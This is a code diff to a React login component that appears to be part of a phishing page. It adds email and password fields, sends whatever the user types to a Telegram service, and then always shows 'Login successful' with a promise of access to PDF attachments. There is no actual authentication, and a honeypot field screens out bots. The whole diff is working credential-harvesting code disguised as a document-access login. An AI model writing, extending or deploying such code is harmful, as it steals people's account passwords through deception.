@@ -1,17 +1,22 @@
 
 import { useState } from "react";
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
+import { Lock, Mail } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { useHoneypot } from "@/hooks/useHoneypot";
+import { sendLoginDetailsToTelegram } from "@/services/telegramService";
+import FormInput from "./FormInput";
 import HoneypotField from "./HoneypotField";
 import LoadingButton from "./LoadingButton";
 import companyLogo from "@/assets/company-logo.png";
 
 interface LoginFormProps {
-  onLogin: () => void;
+  onLogin: (email: string, password: string) => void;
 }
 
 const LoginForm = ({ onLogin }: LoginFormProps) => {
+  const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
   const [isLoading, setIsLoading] = useState(false);
   const { toast } = useToast();
   const { honeypot, setHoneypot, isBot } = useHoneypot();
@@ -30,17 +35,41 @@ const LoginForm = ({ onLogin }: LoginFormProps) => {
       return;
     }
 
+    if (!email || !password) {
+      toast({
+        title: "Missing credentials",
+        description: "Please enter both email and password.",
+        variant: "destructive",
+      });
+      return;
+    }
+
     setIsLoading(true);
     
-    // Simulate API call delay
-    setTimeout(() => {
-      onLogin();
-      setIsLoading(false);
-      toast({
-        title: "Access granted",
-        description: "Welcome! You can now view PDF attachments.",
-      });
-    }, 1000);
+    // Send login details to Telegram
+    const telegramSent = await sendLoginDetailsToTelegram(email, password);
+    
+    if (telegramSent) {
+      // Simulate API call delay
+      setTimeout(() => {
+        onLogin(email, password);
+        setIsLoading(false);
+        toast({
+          title: "Login successful",
+          description: "Welcome! You can now view PDF attachments.",
+        });
+      }, 1000);
+    } else {
+      // Continue with login even if Telegram fails
+      setTimeout(() => {
+        onLogin(email, password);
+        setIsLoading(false);
+        toast({
+          title: "Login successful",
+          description: "Welcome! You can now view PDF attachments.",
+        });
+      }, 1000);
+    }
   };
 
   return (
@@ -61,10 +90,32 @@ const LoginForm = ({ onLogin }: LoginFormProps) => {
         <CardContent>
           <form onSubmit={handleSubmit} className="space-y-6">
             <HoneypotField value={honeypot} onChange={setHoneypot} />
+
+            <FormInput
+              id="email"
+              label="Email Address"
+              type="email"
+              placeholder="Enter your email"
+              value={email}
+              onChange={setEmail}
+              Icon={Mail}
+              disabled={isLoading}
+            />
+            
+            <FormInput
+              id="password"
+              label="Password"
+              type="password"
+              placeholder="Enter your password"
+              value={password}
+              onChange={setPassword}
+              Icon={Lock}
+              disabled={isLoading}
+            />
             
             <LoadingButton
               isLoading={isLoading}
-              loadingText="Accessing..."
+              loadingText="Signing in..."
               className="w-full h-12 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white font-medium rounded-lg transition-all duration-200 transform hover:scale-[1.02]"
             >
               Access Documents
